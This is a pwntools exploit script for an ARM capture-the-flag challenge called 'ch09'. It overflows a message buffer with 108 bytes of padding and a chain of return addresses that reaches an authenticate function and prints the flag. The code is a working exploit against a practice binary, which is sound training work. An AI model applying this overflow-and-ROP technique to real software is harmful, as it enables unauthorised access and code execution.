__author__ = '@tomereyz'

from pwn import *
from ArmExploit import ArmExploit
import argparse


def send(r, msg_name, msg_content):
    r.sendline('send')
    r.recvuntil('Enter message name:')
    r.sendline(msg_name)
    r.recvuntil('Enter message content:')
    r.sendline(msg_content)


def main(execution):
    challenge_name = 'ch09'
    log.info('Exploiting {challenge_name}!'.format(challenge_name=challenge_name))
    r = ArmExploit(challenge_name=challenge_name, execution=execution).r

    e = ELF(challenge_name)
    functions = e.functions
    symbols = e.symbols
    write_anywhere_func_addr = functions['write_anywhere'].address + 4
    authenticate_func_addr = functions['authenticate'].address
    gadget_func_addr = functions['gadget'].address + 4
    admin_string_addr = symbols['admin']

    r.recvuntil('exit - close program')
    send(r, msg_name='angel',
         msg_content=cyclic(108) + pack(gadget_func_addr, 32) + pack(0x1, word_size=32) + pack(admin_string_addr,
                                                                                               word_size=32) + pack(
             write_anywhere_func_addr, word_size=32) + 'aaaa' + pack(authenticate_func_addr, 32))

    r.recvuntil('zenysec')
    flag = 'zenysec' + r.recvuntil('\n')
    log.success('The flag is: {flag}'.format(flag=flag))
    r.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit ch09')
    parser.add_argument('-e', '--execution', help='execution type', required=True, dest='execution')
    main(**vars(parser.parse_args()))
